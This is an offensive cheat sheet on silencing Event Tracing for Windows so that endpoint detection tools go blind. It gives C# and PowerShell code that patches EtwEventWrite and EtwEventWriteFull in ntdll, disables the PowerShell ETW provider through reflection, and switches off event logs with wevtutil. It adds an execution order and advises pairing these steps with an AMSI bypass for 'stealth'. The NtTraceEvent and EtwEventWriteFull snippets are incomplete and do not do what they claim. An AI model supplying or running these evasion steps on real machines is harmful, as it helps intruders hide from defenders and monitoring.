# ETW (Event Tracing for Windows) Bypass

## How ETW Works
ETW is a kernel-level tracing facility that applications and drivers use to emit events. EDR solutions consume ETW providers to detect malicious activity:
- **Microsoft-Windows-DotNETRuntime**: .NET assembly loads, JIT compilation
- **Microsoft-Windows-Kernel-Process**: process creation/termination
- **Microsoft-Windows-Threat-Intelligence**: memory allocation with suspicious attributes
- **Microsoft-Windows-PowerShell**: PowerShell script block logging

## Bypass Techniques

### 1. Patch EtwEventWrite (Full ETW silence)
```csharp
// C# - Patch EtwEventWrite in ntdll.dll
byte[] patch = Environment.Is64BitProcess ?
    new byte[] { 0x48, 0x33, 0xC0, 0xC3 } : // xor rax, rax; ret (x64)
    new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // xor eax, eax; ret 20 (x86)
IntPtr addr = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out _);
Marshal.Copy(patch, 0, addr, patch.Length);
```

### 2. PowerShell ETW Bypass
```powershell
# Disable PowerShell ETW logging via reflection
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
$etwProvider.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider, 0)
```

### 3. .NET Runtime ETW Suspend
```powershell
# Patch NtTraceEvent in ntdll
$ntdll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [Console]::InputEncoding.GetType().Assembly.GetType('Microsoft.Win32.Win32Native').GetMethod('GetProcAddress').Invoke($null, @(
        [Console]::InputEncoding.GetType().Assembly.GetType('Microsoft.Win32.Win32Native').GetMethod('LoadLibrary').Invoke($null, @('ntdll.dll')),
        'NtTraceEvent'
    )),
    [Func[uint, uint, IntPtr, IntPtr, IntPtr, uint]]
)
```

### 4. EtwEventWriteFull Patch (additional coverage)
```csharp
// Some EDR use EtwEventWriteFull instead
IntPtr addr2 = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWriteFull");
// Same patch: return 0 immediately
```

### 5. Provider-Specific Disable
```powershell
# Disable specific ETW providers via wevtutil
wevtutil sl Microsoft-Windows-PowerShell/Operational /e:false
wevtutil sl Microsoft-Windows-DotNETRuntime/Operational /e:false
```

## Execution Order
1. Patch `EtwEventWrite` first (catches most events)
2. Then patch `EtwEventWriteFull` (catches remaining)
3. For PowerShell specifically, additional PSEtwLogProvider reflection

## Detection Notes
- Missing ETW events themselves can be an IOC
- EDR may monitor for `VirtualProtect` on `ntdll.dll` pages
- Combine with AMSI bypass for full PowerShell stealth
